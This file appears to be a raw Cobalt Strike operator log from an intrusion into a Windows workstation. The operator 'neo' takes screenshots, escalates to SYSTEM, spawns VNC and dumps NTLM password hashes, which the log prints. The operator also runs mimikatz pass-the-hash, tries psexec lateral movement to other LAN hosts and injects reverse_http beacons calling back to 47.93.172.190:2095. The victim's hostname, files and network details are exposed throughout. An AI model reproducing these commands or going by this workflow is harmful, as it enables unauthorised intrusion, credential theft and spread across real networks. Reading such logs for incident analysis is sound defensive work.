@@ -1,0 +1,1340 @@
+10/07 06:57:15 UTC [metadata] 112.226.65.29 <- 192.168.110.29; computer: JT-202303111428; user: Administrator *; process: artifact_x64.exe; pid: 14596; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+10/07 06:59:00 UTC [input] <neo> sleep 0
+10/07 06:59:00 UTC [task] <T1029> Tasked beacon to become interactive
+10/07 06:59:14 UTC [checkin] host called home, sent: 16 bytes
+10/07 06:59:36 UTC [input] <neo> screenshot
+10/07 06:59:36 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+10/07 06:59:36 UTC [checkin] host called home, sent: 199779 bytes
+10/07 06:59:39 UTC [output]
+received screenshot of 20211201照片.docx - WPS Office from Administrator (217kb)
+
+10/07 06:59:56 UTC [input] <neo> getsystem
+10/07 06:59:56 UTC [task] <T1134> Tasked beacon to get SYSTEM
+10/07 06:59:56 UTC [checkin] host called home, sent: 3239 bytes
+10/07 06:59:56 UTC [output]
+Impersonated NT AUTHORITY\SYSTEM
+
+10/07 07:00:07 UTC [input] <neo> desktop
+10/07 07:00:07 UTC [checkin] host called home, sent: 16 bytes
+10/07 07:00:09 UTC [task] <> Tasked beacon to spawn VNC server
+10/07 07:00:10 UTC [checkin] host called home, sent: 374794 bytes
+10/07 07:00:13 UTC [output]
+started port forward on 5488 to 127.0.0.1:5488
+
+10/07 07:01:33 UTC [input] <neo> shell shutdown /a
+10/07 07:01:33 UTC [task] <T1059> Tasked beacon to run: shutdown /a
+10/07 07:01:33 UTC [checkin] host called home, sent: 42 bytes
+10/07 07:02:31 UTC [task] <> Tasked beacon to list files in . (from File Browser)
+10/07 07:02:31 UTC [checkin] host called home, sent: 53 bytes
+10/07 07:02:37 UTC [task] <> Tasked beacon to list files in F:\1290143528\ (from File Browser)
+10/07 07:02:37 UTC [checkin] host called home, sent: 31 bytes
+10/07 07:02:38 UTC [task] <> Tasked beacon to list files in F:\ (from File Browser)
+10/07 07:02:38 UTC [checkin] host called home, sent: 20 bytes
+10/07 07:02:42 UTC [task] <> Tasked beacon to list files in F:\桌面\ (from File Browser)
+10/07 07:02:42 UTC [checkin] host called home, sent: 25 bytes
+10/07 07:04:58 UTC [input] <neo> mkdir F:\桌面\笨笨笨
+10/07 07:04:58 UTC [task] <> Tasked beacon to make directory F:\桌面\笨笨笨
+10/07 07:04:58 UTC [task] <> Tasked beacon to list files in F:\桌面\ (from File Browser)
+10/07 07:04:58 UTC [checkin] host called home, sent: 47 bytes
+10/07 07:05:02 UTC [input] <neo> mkdir F:\桌面\笨笨笨
+10/07 07:05:02 UTC [task] <> Tasked beacon to make directory F:\桌面\笨笨笨
+10/07 07:05:02 UTC [task] <> Tasked beacon to list files in F:\桌面\ (from File Browser)
+10/07 07:05:02 UTC [checkin] host called home, sent: 47 bytes
+10/07 07:05:23 UTC [task] <> Tasked beacon to list processes (from Process Browser)
+10/07 07:05:23 UTC [checkin] host called home, sent: 12 bytes
+10/07 07:05:49 UTC [input] <neo> inject 11252 x64 aaa
+10/07 07:05:50 UTC [task] <T1055> Tasked beacon to inject windows/beacon_http/reverse_http (47.93.172.190:2095) into 11252 (x64)
+10/07 07:05:50 UTC [checkin] host called home, sent: 295952 bytes
+10/07 07:06:09 UTC [input] <neo> desktop
+10/07 07:06:10 UTC [checkin] host called home, sent: 16 bytes
+10/07 07:06:12 UTC [task] <> Tasked beacon to spawn VNC server
+10/07 07:06:13 UTC [checkin] host called home, sent: 374794 bytes
+10/07 07:06:15 UTC [output]
+started port forward on 5044 to 127.0.0.1:5044
+
+10/07 07:07:09 UTC [input] <neo> hashdump
+10/07 07:07:09 UTC [task] <T1003, T1055, T1093> Tasked beacon to dump hashes
+10/07 07:07:10 UTC [checkin] host called home, sent: 82541 bytes
+10/07 07:07:11 UTC [output]
+received password hashes:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:12a361516f1c5d9b312bf0f8b6c1581a:::
+
+
+10/07 07:07:48 UTC [input] <neo> mimikatz
+10/07 07:07:48 UTC [error] mimikatz error: not enough arguments
+10/07 07:07:54 UTC [input] <neo> process_browser
+10/07 07:07:54 UTC [task] <> Tasked beacon to list processes (from Process Browser)
+10/07 07:07:54 UTC [checkin] host called home, sent: 12 bytes
+10/07 07:09:19 UTC [input] <neo> net view
+10/07 07:09:19 UTC [task] <T1018, T1093> Tasked beacon to run net view
+10/07 07:09:20 UTC [checkin] host called home, sent: 105057 bytes
+10/07 07:09:21 UTC [output]
+received output:
+List of hosts:
+
+
+
+10/07 07:09:33 UTC [output]
+received output:
+ Server Name             IP Address                       Platform  Version  Type   Comment
+ -----------             ----------                       --------  -------  ----   -------
+[-] Error: 1231
+
+
+10/07 07:12:24 UTC [input] <neo> shell ipconfig
+10/07 07:12:24 UTC [task] <T1059> Tasked beacon to run: ipconfig
+10/07 07:12:25 UTC [checkin] host called home, sent: 39 bytes
+10/07 07:12:25 UTC [output]
+received output:
+
+Windows IP 配置
+
+
+以太网适配器 以太网:
+
+   连接特定的 DNS 后缀 . . . . . . . : lan
+   本地链接 IPv6 地址. . . . . . . . : fe80::7c7f:4fcf:145c:4df0%3
+   IPv4 地址 . . . . . . . . . . . . : 192.168.110.29
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 192.168.110.1
+
+
+10/07 07:15:19 UTC [task] <T1093> Tasked beacon to run .NET program: navicatpwd.exe
+10/07 07:15:19 UTC [checkin] host called home, sent: 125483 bytes
+10/07 07:15:21 UTC [output]
+received output:
+Maybe Not Install Navicat
+
+
+
+10/07 07:17:12 UTC [input] <neo> rev2self
+10/07 07:17:12 UTC [task] <T1134> Tasked beacon to revert token
+10/07 07:17:12 UTC [input] <neo> pth JT-202303111428\Administrator 31d6cfe0d16ae931b73c59d7e0c089c0
+10/07 07:17:12 UTC [checkin] host called home, sent: 31 bytes
+10/07 07:17:13 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:"Administrator" /domain:"JT-202303111428" /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:"%COMSPEC% /c echo f42fa13fe66 > \\.\pipe\379f22" command
+10/07 07:17:13 UTC [checkin] host called home, sent: 312840 bytes
+10/07 07:17:13 UTC [input] <neo> jump psexec 192.168.110.246 aaa
+10/07 07:17:14 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_http/reverse_http (47.93.172.190:2095) on 192.168.110.246 via Service Control Manager (\\192.168.110.246\ADMIN$\3568c6c.exe)
+10/07 07:17:14 UTC [indicator] service: \\192.168.110.246 3568c6c
+10/07 07:17:14 UTC [indicator] file: 50595df6e9261c62a90fbf745ad7418c 311296 bytes \\192.168.110.246\ADMIN$\3568c6c.exe
+10/07 07:17:14 UTC [checkin] host called home, sent: 313745 bytes
+10/07 07:17:19 UTC [output]
+Impersonated JT-202303111428\Administrator
+
+10/07 07:17:19 UTC [error] could not upload file: 1326 - ERROR_LOGON_FAILURE
+10/07 07:17:19 UTC [error] Could not open service control manager on 192.168.110.246: 5
+10/07 07:17:19 UTC [output]
+received output:
+user	: Administrator
+domain	: JT-202303111428
+program	: C:\Windows\system32\cmd.exe /c echo f42fa13fe66 > \\.\pipe\379f22
+impers.	: no
+NTLM	: 31d6cfe0d16ae931b73c59d7e0c089c0
+  |  PID  1392
+  |  TID  7548
+  |  LSA Process is now R/W
+  |  LUID 0 ; 575130492 (00000000:2247cb7c)
+  \_ msv1_0   - data copy @ 000001E26D8F7C70 : OK !
+  \_ kerberos - 
+
+
+10/07 07:18:23 UTC [input] <neo> rev2self
+10/07 07:18:23 UTC [task] <T1134> Tasked beacon to revert token
+10/07 07:18:23 UTC [input] <neo> pth JT-202303111428\Administrator 31d6cfe0d16ae931b73c59d7e0c089c0
+10/07 07:18:23 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:"Administrator" /domain:"JT-202303111428" /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:"%COMSPEC% /c echo 25de50d8c69 > \\.\pipe\046dc7" command
+10/07 07:18:23 UTC [checkin] host called home, sent: 31 bytes
+10/07 07:18:23 UTC [checkin] host called home, sent: 312840 bytes
+10/07 07:18:23 UTC [input] <neo> jump psexec64 192.168.110.243 aaa
+10/07 07:18:23 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_http/reverse_http (47.93.172.190:2095) on 192.168.110.243 via Service Control Manager (\\192.168.110.243\ADMIN$\caec97a.exe)
+10/07 07:18:23 UTC [indicator] service: \\192.168.110.243 caec97a
+10/07 07:18:23 UTC [indicator] file: 8575217d01da40ceded07a32e4773cf1 316416 bytes \\192.168.110.243\ADMIN$\caec97a.exe
+10/07 07:18:24 UTC [checkin] host called home, sent: 318865 bytes
+10/07 07:18:37 UTC [output]
+Impersonated JT-202303111428\Administrator
+
+10/07 07:18:37 UTC [error] could not upload file: 53 - ERROR_BAD_NETPATH
+10/07 07:18:37 UTC [error] Could not open service control manager on 192.168.110.243: 1722
+10/07 07:18:37 UTC [output]
+received output:
+user	: Administrator
+domain	: JT-202303111428
+program	: C:\Windows\system32\cmd.exe /c echo 25de50d8c69 > \\.\pipe\046dc7
+impers.	: no
+NTLM	: 31d6cfe0d16ae931b73c59d7e0c089c0
+  |  PID  3004
+  |  TID  11748
+  |  LSA Process is now R/W
+  |  LUID 0 ; 575247083 (00000000:224992eb)
+  \_ msv1_0   - data copy @ 000001E26E3A0C70 : OK !
+  \_ kerberos - 
+
+
+10/07 07:19:26 UTC [input] <neo> desktop
+10/07 07:19:26 UTC [checkin] host called home, sent: 16 bytes
+10/07 07:19:29 UTC [task] <> Tasked beacon to spawn VNC server
+10/07 07:19:29 UTC [checkin] host called home, sent: 374794 bytes
+10/07 07:19:32 UTC [output]
+started port forward on 9164 to 127.0.0.1:9164
+
+10/07 07:21:18 UTC [task] <> Tasked beacon to list files in . (from File Browser)
+10/07 07:21:18 UTC [checkin] host called home, sent: 19 bytes
+10/07 07:21:33 UTC [task] <> Tasked beacon to list files in F:\ (from File Browser)
+10/07 07:21:33 UTC [checkin] host called home, sent: 20 bytes
+10/07 07:21:33 UTC [task] <> Tasked beacon to list files in F:\ (from File Browser)
+10/07 07:21:34 UTC [checkin] host called home, sent: 20 bytes
+10/07 07:21:35 UTC [task] <> Tasked beacon to list files in F:\桌面\ (from File Browser)
+10/07 07:21:35 UTC [checkin] host called home, sent: 25 bytes
+10/07 07:21:35 UTC [task] <> Tasked beacon to list files in F:\桌面\ (from File Browser)
+10/07 07:21:35 UTC [checkin] host called home, sent: 25 bytes
+10/07 07:21:52 UTC [task] <> Tasked beacon to list files in F:\桌面\2023年3月4月产值\ (from File Browser)
+10/07 07:21:52 UTC [checkin] host called home, sent: 42 bytes
+10/07 07:22:02 UTC [task] <> Tasked beacon to list drives (from File Browser)
+10/07 07:22:02 UTC [checkin] host called home, sent: 12 bytes
+10/07 07:22:04 UTC [task] <> Tasked beacon to list files in C:\ (from File Browser)
+10/07 07:22:04 UTC [checkin] host called home, sent: 20 bytes
+10/07 07:22:10 UTC [task] <> Tasked beacon to list files in E:\ (from File Browser)
+10/07 07:22:10 UTC [checkin] host called home, sent: 20 bytes
+10/07 07:22:10 UTC [task] <> Tasked beacon to list files in E:\ (from File Browser)
+10/07 07:22:10 UTC [checkin] host called home, sent: 20 bytes
+10/07 07:22:13 UTC [task] <> Tasked beacon to list files in D:\ (from File Browser)
+10/07 07:22:13 UTC [checkin] host called home, sent: 20 bytes
+10/07 07:22:13 UTC [task] <> Tasked beacon to list files in D:\ (from File Browser)
+10/07 07:22:13 UTC [checkin] host called home, sent: 20 bytes
+10/07 07:22:23 UTC [task] <> Tasked beacon to list files in D:\Resource.9.7.16.29187\ (from File Browser)
+10/07 07:22:23 UTC [checkin] host called home, sent: 42 bytes
+10/07 07:22:25 UTC [task] <> Tasked beacon to list files in D:\flyedt_tmp\ (from File Browser)
+10/07 07:22:25 UTC [checkin] host called home, sent: 31 bytes
+10/07 07:22:25 UTC [task] <> Tasked beacon to list files in D:\flyedt_tmp\ (from File Browser)
+10/07 07:22:25 UTC [checkin] host called home, sent: 31 bytes
+10/07 07:23:48 UTC [output]
+Ladon Open3389
+
+10/07 07:23:55 UTC [error] Task size of 1050171 bytes is over the max task size limit of 1048576 bytes.
+10/07 07:24:08 UTC [input] <neo> shell netstat -ano
+10/07 07:24:08 UTC [task] <T1059> Tasked beacon to run: netstat -ano
+10/07 07:24:08 UTC [checkin] host called home, sent: 43 bytes
+10/07 07:24:08 UTC [output]
+received output:
+
+活动连接
+
+  协议  本地地址          外部地址        状态           PID
+  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       3648
+  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       3648
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       3648
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1072
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       3648
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:990            0.0.0.0:0              LISTENING       3648
+  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       7076
+  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       14636
+  TCP    0.0.0.0:11200          0.0.0.0:0              LISTENING       3740
+  TCP    0.0.0.0:16422          0.0.0.0:0              LISTENING       3740
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       976
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       828
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1600
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1428
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2440
+  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       904
+  TCP    0.0.0.0:55368          0.0.0.0:0              LISTENING       19624
+  TCP    127.0.0.1:4301         0.0.0.0:0              LISTENING       7908
+  TCP    127.0.0.1:4709         0.0.0.0:0              LISTENING       19624
+  TCP    127.0.0.1:8440         0.0.0.0:0              LISTENING       3804
+  TCP    127.0.0.1:8680         0.0.0.0:0              LISTENING       11324
+  TCP    127.0.0.1:9164         127.0.0.1:62221        ESTABLISHED     2340
+  TCP    127.0.0.1:19716        0.0.0.0:0              LISTENING       18604
+  TCP    127.0.0.1:43958        0.0.0.0:0              LISTENING       3648
+  TCP    127.0.0.1:49678        127.0.0.1:49679        ESTABLISHED     3732
+  TCP    127.0.0.1:49679        127.0.0.1:49678        ESTABLISHED     3732
+  TCP    127.0.0.1:61910        0.0.0.0:0              LISTENING       3804
+  TCP    127.0.0.1:62221        127.0.0.1:9164         ESTABLISHED     14596
+  TCP    127.0.0.1:64502        127.0.0.1:64503        ESTABLISHED     3804
+  TCP    127.0.0.1:64503        127.0.0.1:64502        ESTABLISHED     3804
+  TCP    192.168.110.29:139     0.0.0.0:0              LISTENING       4
+  TCP    192.168.110.29:7680    192.168.110.203:51544  TIME_WAIT       0
+  TCP    192.168.110.29:7680    192.168.110.203:51569  TIME_WAIT       0
+  TCP    192.168.110.29:7680    192.168.110.203:51584  TIME_WAIT       0
+  TCP    192.168.110.29:49161   124.70.62.106:443      CLOSE_WAIT      17080
+  TCP    192.168.110.29:49162   124.70.62.106:443      CLOSE_WAIT      17080
+  TCP    192.168.110.29:49163   124.70.62.106:443      CLOSE_WAIT      17080
+  TCP    192.168.110.29:49171   119.3.190.20:443       CLOSE_WAIT      19624
+  TCP    192.168.110.29:49172   120.46.176.100:443     CLOSE_WAIT      19624
+  TCP    192.168.110.29:49173   119.3.191.240:443      CLOSE_WAIT      19624
+  TCP    192.168.110.29:49175   120.46.176.100:443     CLOSE_WAIT      19624
+  TCP    192.168.110.29:49179   120.46.176.100:443     CLOSE_WAIT      19624
+  TCP    192.168.110.29:49181   124.70.62.106:443      CLOSE_WAIT      17080
+  TCP    192.168.110.29:49185   124.70.62.106:443      CLOSE_WAIT      17080
+  TCP    192.168.110.29:49186   119.3.164.58:443       CLOSE_WAIT      17080
+  TCP    192.168.110.29:49192   119.3.164.58:443       CLOSE_WAIT      17080
+  TCP    192.168.110.29:49774   220.194.116.51:443     CLOSE_WAIT      7908
+  TCP    192.168.110.29:50813   116.130.229.204:443    CLOSE_WAIT      7908
+  TCP    192.168.110.29:50936   58.251.106.223:443     CLOSE_WAIT      7908
+  TCP    192.168.110.29:51237   192.168.110.246:445    ESTABLISHED     4
+  TCP    192.168.110.29:52938   60.29.238.111:443      CLOSE_WAIT      7908
+  TCP    192.168.110.29:52941   220.194.116.51:443     CLOSE_WAIT      7908
+  TCP    192.168.110.29:52976   220.194.116.51:443     CLOSE_WAIT      7908
+  TCP    192.168.110.29:52977   220.194.116.51:443     CLOSE_WAIT      7908
+  TCP    192.168.110.29:52978   220.194.116.51:443     CLOSE_WAIT      7908
+  TCP    192.168.110.29:53477   218.12.97.104:8080     TIME_WAIT       0
+  TCP    192.168.110.29:55227   220.194.116.51:443     CLOSE_WAIT      7908
+  TCP    192.168.110.29:55228   220.194.116.51:443     CLOSE_WAIT      7908
+  TCP    192.168.110.29:55780   152.199.43.62:443      CLOSE_WAIT      20564
+  TCP    192.168.110.29:55846   152.195.38.76:80       CLOSE_WAIT      20564
+  TCP    192.168.110.29:55861   23.1.96.83:443         CLOSE_WAIT      20564
+  TCP    192.168.110.29:56493   1.56.81.252:443        CLOSE_WAIT      18012
+  TCP    192.168.110.29:56495   1.56.81.252:443        CLOSE_WAIT      18012
+  TCP    192.168.110.29:56505   1.56.81.252:443        CLOSE_WAIT      18012
+  TCP    192.168.110.29:56506   1.56.81.252:443        CLOSE_WAIT      18012
+  TCP    192.168.110.29:56507   1.56.81.252:443        CLOSE_WAIT      18012
+  TCP    192.168.110.29:56508   1.56.81.252:443        CLOSE_WAIT      18012
+  TCP    192.168.110.29:56598   220.196.139.240:443    ESTABLISHED     11324
+  TCP    192.168.110.29:56602   123.125.0.161:8080     ESTABLISHED     7908
+  TCP    192.168.110.29:56604   123.125.0.195:8080     ESTABLISHED     11508
+  TCP    192.168.110.29:56707   111.206.147.210:80     TIME_WAIT       0
+  TCP    192.168.110.29:56736   218.12.97.104:8080     CLOSE_WAIT      7908
+  TCP    192.168.110.29:56757   111.206.99.40:8080     TIME_WAIT       0
+  TCP    192.168.110.29:57186   203.107.1.1:80         CLOSE_WAIT      3804
+  TCP    192.168.110.29:57187   125.39.216.188:443     CLOSE_WAIT      3804
+  TCP    192.168.110.29:58186   49.232.74.59:443       TIME_WAIT       0
+  TCP    192.168.110.29:58231   121.36.32.232:443      CLOSE_WAIT      17080
+  TCP    192.168.110.29:58426   192.168.110.153:5040   FIN_WAIT_2      16728
+  TCP    192.168.110.29:58918   60.29.242.183:443      CLOSE_WAIT      18604
+  TCP    192.168.110.29:58919   220.194.118.67:443     CLOSE_WAIT      18604
+  TCP    192.168.110.29:59214   220.194.116.116:443    CLOSE_WAIT      7908
+  TCP    192.168.110.29:60695   119.167.224.185:443    CLOSE_WAIT      7908
+  TCP    192.168.110.29:61751   20.197.71.89:443       ESTABLISHED     3492
+  TCP    192.168.110.29:61752   220.194.111.201:443    CLOSE_WAIT      7908
+  TCP    192.168.110.29:61997   39.91.132.42:443       CLOSE_WAIT      19624
+  TCP    192.168.110.29:62535   192.168.110.143:6000   SYN_SENT        16728
+  TCP    192.168.110.29:62536   192.168.110.143:5999   SYN_SENT        16728
+  TCP    192.168.110.29:62537   192.168.110.143:5998   SYN_SENT        16728
+  TCP    192.168.110.29:62538   192.168.110.143:5997   SYN_SENT        16728
+  TCP    192.168.110.29:62539   192.168.110.143:5996   SYN_SENT        16728
+  TCP    192.168.110.29:62540   192.168.110.143:5995   SYN_SENT        16728
+  TCP    192.168.110.29:62541   192.168.110.143:5994   SYN_SENT        16728
+  TCP    192.168.110.29:62542   192.168.110.143:5993   SYN_SENT        16728
+  TCP    192.168.110.29:62543   192.168.110.143:5992   SYN_SENT        16728
+  TCP    192.168.110.29:62544   192.168.110.143:5991   SYN_SENT        16728
+  TCP    192.168.110.29:62545   192.168.110.143:5990   SYN_SENT        16728
+  TCP    192.168.110.29:62546   192.168.110.143:5989   SYN_SENT        16728
+  TCP    192.168.110.29:62547   192.168.110.143:5988   SYN_SENT        16728
+  TCP    192.168.110.29:62548   192.168.110.143:5987   SYN_SENT        16728
+  TCP    192.168.110.29:62549   192.168.110.143:5986   SYN_SENT        16728
+  TCP    192.168.110.29:62550   192.168.110.143:5985   SYN_SENT        16728
+  TCP    192.168.110.29:62551   192.168.110.143:5984   SYN_SENT        16728
+  TCP    192.168.110.29:62552   192.168.110.143:5983   SYN_SENT        16728
+  TCP    192.168.110.29:62553   192.168.110.143:5982   SYN_SENT        16728
+  TCP    192.168.110.29:62554   192.168.110.143:5981   SYN_SENT        16728
+  TCP    192.168.110.29:62555   192.168.110.143:5980   SYN_SENT        16728
+  TCP    192.168.110.29:62556   192.168.110.143:5979   SYN_SENT        16728
+  TCP    192.168.110.29:62557   192.168.110.143:5978   SYN_SENT        16728
+  TCP    192.168.110.29:62558   192.168.110.143:5977   SYN_SENT        16728
+  TCP    192.168.110.29:62559   192.168.110.143:5976   SYN_SENT        16728
+  TCP    192.168.110.29:62560   192.168.110.143:5975   SYN_SENT        16728
+  TCP    192.168.110.29:62561   192.168.110.143:5974   SYN_SENT        16728
+  TCP    192.168.110.29:62562   192.168.110.143:5973   SYN_SENT        16728
+  TCP    192.168.110.29:62563   192.168.110.143:5972   SYN_SENT        16728
+  TCP    192.168.110.29:62564   192.168.110.143:5971   SYN_SENT        16728
+  TCP    192.168.110.29:62565   192.168.110.143:5970   SYN_SENT        16728
+  TCP    192.168.110.29:62566   192.168.110.143:5969   SYN_SENT        16728
+  TCP    192.168.110.29:62567   192.168.110.143:5968   SYN_SENT        16728
+  TCP    192.168.110.29:62568   192.168.110.143:5967   SYN_SENT        16728
+  TCP    192.168.110.29:62569   192.168.110.143:5966   SYN_SENT        16728
+  TCP    192.168.110.29:62570   192.168.110.143:5965   SYN_SENT        16728
+  TCP    192.168.110.29:62571   192.168.110.143:5964   SYN_SENT        16728
+  TCP    192.168.110.29:62572   192.168.110.143:5963   SYN_SENT        16728
+  TCP    192.168.110.29:62573   192.168.110.143:5962   SYN_SENT        16728
+  TCP    192.168.110.29:62574   192.168.110.143:5961   SYN_SENT        16728
+  TCP    192.168.110.29:62575   192.168.110.143:5960   SYN_SENT        16728
+  TCP    192.168.110.29:62576   192.168.110.143:5959   SYN_SENT        16728
+  TCP    192.168.110.29:62577   192.168.110.143:5958   SYN_SENT        16728
+  TCP    192.168.110.29:62578   192.168.110.143:5957   SYN_SENT        16728
+  TCP    192.168.110.29:62579   192.168.110.143:5956   SYN_SENT        16728
+  TCP    192.168.110.29:62580   192.168.110.143:5955   SYN_SENT        16728
+  TCP    192.168.110.29:62581   192.168.110.143:5954   SYN_SENT        16728
+  TCP    192.168.110.29:62582   192.168.110.143:5953   SYN_SENT        16728
+  TCP    192.168.110.29:62583   192.168.110.143:5952   SYN_SENT        16728
+  TCP    192.168.110.29:62584   192.168.110.143:5951   SYN_SENT        16728
+  TCP    192.168.110.29:62585   192.168.110.143:5950   SYN_SENT        16728
+  TCP    192.168.110.29:62586   192.168.110.143:5949   SYN_SENT        16728
+  TCP    192.168.110.29:62587   192.168.110.143:5948   SYN_SENT        16728
+  TCP    192.168.110.29:62588   192.168.110.143:5947   SYN_SENT        16728
+  TCP    192.168.110.29:62589   192.168.110.143:5946   SYN_SENT        16728
+  TCP    192.168.110.29:62590   192.168.110.143:5945   SYN_SENT        16728
+  TCP    192.168.110.29:62591   192.168.110.143:5944   SYN_SENT        16728
+  TCP    192.168.110.29:62592   192.168.110.143:5943   SYN_SENT        16728
+  TCP    192.168.110.29:62593   192.168.110.143:5942   SYN_SENT        16728
+  TCP    192.168.110.29:62594   192.168.110.143:5941   SYN_SENT        16728
+  TCP    192.168.110.29:62595   192.168.110.143:5940   SYN_SENT        16728
+  TCP    192.168.110.29:62596   192.168.110.143:5939   SYN_SENT        16728
+  TCP    192.168.110.29:62597   192.168.110.143:5938   SYN_SENT        16728
+  TCP    192.168.110.29:62598   192.168.110.143:5937   SYN_SENT        16728
+  TCP    192.168.110.29:62599   192.168.110.143:5936   SYN_SENT        16728
+  TCP    192.168.110.29:62600   192.168.110.143:5935   SYN_SENT        16728
+  TCP    192.168.110.29:62601   192.168.110.143:5934   SYN_SENT        16728
+  TCP    192.168.110.29:62602   192.168.110.143:5933   SYN_SENT        16728
+  TCP    192.168.110.29:62603   192.168.110.143:5932   SYN_SENT        16728
+  TCP    192.168.110.29:62604   192.168.110.143:5931   SYN_SENT        16728
+  TCP    192.168.110.29:62605   192.168.110.143:5930   SYN_SENT        16728
+  TCP    192.168.110.29:62606   192.168.110.143:5929   SYN_SENT        16728
+  TCP    192.168.110.29:62607   192.168.110.143:5928   SYN_SENT        16728
+  TCP    192.168.110.29:62608   192.168.110.143:5927   SYN_SENT        16728
+  TCP    192.168.110.29:62609   192.168.110.143:5926   SYN_SENT        16728
+  TCP    192.168.110.29:62610   192.168.110.143:5925   SYN_SENT        16728
+  TCP    192.168.110.29:62611   192.168.110.143:5924   SYN_SENT        16728
+  TCP    192.168.110.29:62612   192.168.110.143:5923   SYN_SENT        16728
+  TCP    192.168.110.29:62613   192.168.110.143:5922   SYN_SENT        16728
+  TCP    192.168.110.29:62614   192.168.110.143:5921   SYN_SENT        16728
+  TCP    192.168.110.29:62615   192.168.110.143:5920   SYN_SENT        16728
+  TCP    192.168.110.29:62616   192.168.110.143:5919   SYN_SENT        16728
+  TCP    192.168.110.29:62617   192.168.110.143:5918   SYN_SENT        16728
+  TCP    192.168.110.29:62618   192.168.110.143:5917   SYN_SENT        16728
+  TCP    192.168.110.29:62619   192.168.110.143:5916   SYN_SENT        16728
+  TCP    192.168.110.29:62620   192.168.110.143:5915   SYN_SENT        16728
+  TCP    192.168.110.29:62621   192.168.110.143:5914   SYN_SENT        16728
+  TCP    192.168.110.29:62622   192.168.110.143:5913   SYN_SENT        16728
+  TCP    192.168.110.29:62623   192.168.110.143:5912   SYN_SENT        16728
+  TCP    192.168.110.29:62624   192.168.110.143:5911   SYN_SENT        16728
+  TCP    192.168.110.29:62625   192.168.110.143:5910   SYN_SENT        16728
+  TCP    192.168.110.29:62626   192.168.110.143:5909   SYN_SENT        16728
+  TCP    192.168.110.29:62627   192.168.110.143:5908   SYN_SENT        16728
+  TCP    192.168.110.29:62628   192.168.110.143:5907   SYN_SENT        16728
+  TCP    192.168.110.29:62629   192.168.110.143:5906   SYN_SENT        16728
+  TCP    192.168.110.29:62630   192.168.110.143:5905   SYN_SENT        16728
+  TCP    192.168.110.29:62631   192.168.110.143:5904   SYN_SENT        16728
+  TCP    192.168.110.29:62632   192.168.110.143:5903   SYN_SENT        16728
+  TCP    192.168.110.29:62633   192.168.110.143:5902   SYN_SENT        16728
+  TCP    192.168.110.29:62634   192.168.110.143:5901   SYN_SENT        16728
+  TCP    192.168.110.29:62635   192.168.110.143:5900   SYN_SENT        16728
+  TCP    192.168.110.29:62636   192.168.110.143:5899   SYN_SENT        16728
+  TCP    192.168.110.29:62637   192.168.110.143:5898   SYN_SENT        16728
+  TCP    192.168.110.29:62638   192.168.110.143:5897   SYN_SENT        16728
+  TCP    192.168.110.29:62639   192.168.110.143:5896   SYN_SENT        16728
+  TCP    192.168.110.29:62640   192.168.110.143:5895   SYN_SENT        16728
+  TCP    192.168.110.29:62641   192.168.110.143:5894   SYN_SENT        16728
+  TCP    192.168.110.29:62642   192.168.110.143:5893   SYN_SENT        16728
+  TCP    192.168.110.29:62643   192.168.110.143:5892   SYN_SENT        16728
+  TCP    192.168.110.29:62644   192.168.110.143:5891   SYN_SENT        16728
+  TCP    192.168.110.29:62645   192.168.110.143:5890   SYN_SENT        16728
+  TCP    192.168.110.29:62646   192.168.110.143:5889   SYN_SENT        16728
+  TCP    192.168.110.29:62647   192.168.110.143:5888   SYN_SENT        16728
+  TCP    192.168.110.29:62648   192.168.110.143:5887   SYN_SENT        16728
+  TCP    192.168.110.29:62649   192.168.110.143:5886   SYN_SENT        16728
+  TCP    192.168.110.29:62650   192.168.110.143:5885   SYN_SENT        16728
+  TCP    192.168.110.29:62651   192.168.110.143:5884   SYN_SENT        16728
+  TCP    192.168.110.29:62686   47.93.172.190:2095     CLOSE_WAIT      11252
+  TCP    192.168.110.29:62760   192.168.110.143:5883   SYN_SENT        16728
+  TCP    192.168.110.29:62761   192.168.110.143:5882   SYN_SENT        16728
+  TCP    192.168.110.29:62762   192.168.110.143:5881   SYN_SENT        16728
+  TCP    192.168.110.29:62763   192.168.110.143:5880   SYN_SENT        16728
+  TCP    192.168.110.29:62764   192.168.110.143:5879   SYN_SENT        16728
+  TCP    192.168.110.29:62765   192.168.110.143:5878   SYN_SENT        16728
+  TCP    192.168.110.29:62766   192.168.110.143:5877   SYN_SENT        16728
+  TCP    192.168.110.29:62767   192.168.110.143:5876   SYN_SENT        16728
+  TCP    192.168.110.29:62768   192.168.110.143:5875   SYN_SENT        16728
+  TCP    192.168.110.29:62769   192.168.110.143:5874   SYN_SENT        16728
+  TCP    192.168.110.29:62770   192.168.110.143:5873   SYN_SENT        16728
